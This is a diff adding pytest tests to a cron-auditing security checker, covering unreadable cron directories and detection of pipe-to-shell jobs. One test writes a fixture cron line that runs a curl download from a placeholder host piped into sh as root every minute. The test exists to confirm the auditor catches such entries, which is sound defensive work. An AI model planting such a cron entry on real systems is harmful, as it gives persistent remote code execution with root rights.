@@ -239,3 +239,47 @@ def test_ssh_host_keys_unreadable_emits_a_note():
     i18n.init("en")
     result = check_file_perms(FilePermsSnapshot(ssh_host_keys_readable=False), t=i18n.t)
     assert "file_perms.ssh_host_keys_unreadable" in [f.key for f in result.findings]
+
+
+def test_cron_d_denied_is_recorded_unreadable_not_empty(
+    shut, tmp_path, monkeypatch, python314_predicates
+):
+    """A refused /etc/cron.d must land in unreadable_files (verdict withheld),
+    not be scanned as empty — a pipe-to-shell cron inside would go unaudited."""
+    import bob.checks.cron_audit as CA
+
+    monkeypatch.setattr(CA, "_CRON_FORMAT_DIRS", [shut / "cron.d"])   # stat denied
+    monkeypatch.setattr(CA, "_CRON_SCRIPT_DIRS", [])
+    monkeypatch.setattr(CA, "_SYSTEM_CRONTABS", [])
+    monkeypatch.setattr(CA, "_USER_CRONTAB_DIR", tmp_path / "nouser")
+    snap = CA.CronAuditSnapshot.from_system()
+    assert str(shut / "cron.d") in snap.unreadable_files
+
+
+def test_cron_d_readable_finds_pipe_to_shell(tmp_path, monkeypatch):
+    """Polarity: a readable cron.d is scanned and its pipe-to-shell caught."""
+    import bob.checks.cron_audit as CA
+
+    d = tmp_path / "cron.d"
+    d.mkdir()
+    (d / "job").write_text("* * * * * root curl http://x/s.sh | sh\n", encoding="utf-8")
+    monkeypatch.setattr(CA, "_CRON_FORMAT_DIRS", [d])
+    monkeypatch.setattr(CA, "_CRON_SCRIPT_DIRS", [])
+    monkeypatch.setattr(CA, "_SYSTEM_CRONTABS", [])
+    monkeypatch.setattr(CA, "_USER_CRONTAB_DIR", tmp_path / "nouser")
+    snap = CA.CronAuditSnapshot.from_system()
+    assert snap.pipe_to_shell_entries, "readable cron.d pipe-to-shell missed"
+    assert str(d) not in snap.unreadable_files
+
+
+def test_user_crontab_dir_denied_is_recorded_unreadable(
+    shut, tmp_path, monkeypatch, python314_predicates
+):
+    import bob.checks.cron_audit as CA
+
+    monkeypatch.setattr(CA, "_CRON_FORMAT_DIRS", [])
+    monkeypatch.setattr(CA, "_CRON_SCRIPT_DIRS", [])
+    monkeypatch.setattr(CA, "_SYSTEM_CRONTABS", [])
+    monkeypatch.setattr(CA, "_USER_CRONTAB_DIR", shut / "crontabs")   # stat denied
+    snap = CA.CronAuditSnapshot.from_system()
+    assert str(shut / "crontabs") in snap.unreadable_files
